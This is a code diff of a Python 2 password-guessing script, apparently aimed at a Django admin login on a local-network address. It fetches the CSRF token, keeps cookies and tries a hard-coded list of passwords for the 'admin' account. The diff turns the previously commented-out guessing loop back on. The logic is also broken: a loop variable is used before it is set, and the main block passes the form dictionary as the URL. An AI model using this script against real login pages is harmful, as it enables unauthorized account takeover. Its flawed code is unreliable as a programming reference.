@@ -12,23 +12,26 @@ import cookielib
 import time
 
 class CookieAuthCrack():
+    url11 = "http://192.168.192.214:8000/admin/"
+    url_pre = "http://192.168.192.214:8000/blog/add/"
+    url_pre2 = "http://192.168.192.214:8000/admin/auth/user/1/"
+    cookie_file11 = "/tmp/cookie11.txt"
+    agent11 = "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)"
+    user11 = "admin"
+    pwd11 = ['admin2', 'aaa', 'bbb', 'ksksie','ssdssw','scbh001', 'admin']
+    csrfM = ""
+    post_dict = {
+        #'username': username,
+        'this_is_the_login_form': 1,
+        'next': '/admin/',
+        }
     def __init__(self, user_agent=None):
-        url11 = "http://192.168.192.214:8000/admin/"
-        url_pre = "http://192.168.192.214:8000/blog/add/"
-        url_pre2 = "http://192.168.192.214:8000/admin/auth/user/1/"
-        cookie_file11 = "/tmp/cookie11.txt"
-        agent11 = "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)"
-        user11 = "admin"
-        pwd11 = ['admin2', 'aaa', 'bbb', 'ksksie','ssdssw','scbh001', 'admin']
-        csrfM = ""
-
         if not user_agent:
             user_agent = self.agent11
         self.opener = urllib2.build_opener()
         urllib2.install_opener(self.opener)
         self.client_headers = ('User-Agent', user_agent)
         self.opener.addheaders = [self.client_headers]
-        self.post_dict = {}
 
     def add_cookie(self):
         self.ckjar = cookielib.MozillaCookieJar(self.cookie_file11)
@@ -73,18 +76,7 @@ class CookieAuthCrack():
             self.csrfM = "not found"
         return self.csrfM
 
-    def make_dict(self, post_data={}):
-        if post_data.get('user'):
-            self.post_dict[post_data['user']] = "AAAAAA"
-        if post_data.get('passwd'):
-            self.post_dict[post_data['passwd']] = "pwdpwdpwd"
-        if post_data.get('other', None):
-            print post_data.get('other')
-            for other_key in post_data['other']:
-                self.post_dict[other_key] = post_data['other'][other_key]
-        return
-
-    def crack(self, url=None, username=None, pwd_list=None, post_data=None):
+    def crack(self, url=None, username=None, pwd_list=[], post_data={}):
         if not url:
             url = self.url11
         if not pwd_list:
@@ -95,16 +87,17 @@ class CookieAuthCrack():
         if not self.csrfM:
             self.get_csrf(self.read_url_with_cookie(url))
 
+
         self.post_dict['username'] = username
         self.post_dict['password'] = key1
-        self.post_dict[post_data['user']] = username
-        if post_data['other']:
-            for other_key in post_data['other']:
-                self.post_dict[other_key] = post_data[other_key]
+        # self.post_dict[post_data['user']] = username
+        # if post_data['other']:
+        #     for other_key in post_data['other']:
+        #         self.post_dict[other_key] = post_data[other_key]
                 
         if self.csrfM != "not found":
             self.post_dict['csrfmiddlewaretoken'] =  self.csrfM
-        """
+
         for key1 in pwd_list:
             self.post_dict[post_data['pwd']] = key1
             pwd_encode = urllib.urlencode(self.post_dict)
@@ -128,34 +121,13 @@ class CookieAuthCrack():
                     self.ckjar.save()
                     return key1
         return
-        """
 
 if __name__ == "__main__":
     s11 = CookieAuthCrack()
     s11.add_cookie()
-    post_data1 = {
+    post_data = {
         'user': 'username',
-        'passwd': 'password',
-        'other': {'other1': 'OTHER123',
-                  'other2': 'OTHER234',
-                  'this_is_the_login_form': 1,
-                  'next': '/admin/',
-                  }
+        'pwd': 'password',
         }
-    # pwd = s11.crack(post_data)
-    s11.make_dict(post_data1)
-    # print s11.post_dict
-    print "test2"
-    s12 = CookieAuthCrack()
-    print s12.post_dict
-    post_data2 = {
-        'user': 'user1',
-        'passwd': 'passwd1',
-        'other': {'this_is_the_login_form': 1,
-                  'next': '/admin/',
-                  }
-        }
-    s12.make_dict(post_data2)
-    print s12.post_dict
-    s13 = CookieAuthCrack()
-    print s13
+    pwd = s11.crack(post_data)
+    print "pwd(%s)" % (pwd)
